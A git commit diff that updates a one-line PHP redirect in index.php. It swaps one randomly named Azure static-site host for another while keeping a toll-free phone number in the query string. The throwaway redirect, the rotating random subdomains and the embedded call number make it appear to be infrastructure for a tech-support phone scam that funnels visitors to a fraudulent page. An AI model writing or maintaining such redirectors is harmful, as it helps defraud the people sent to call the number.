7d868b85e1d110768ce5ec4e0d8a09230531d80f
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-03 20:13:24 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://cessed3efe4fewsv324fewf3.z1.web.core.windows.net/index.html?Aniph=1-888-881-1980");
+header("Location: https://fellsaiuhd8ewbyweid8gu3e.z13.web.core.windows.net/index.html?Aniph=1-888-881-1980");
 
 exit;
 ?>
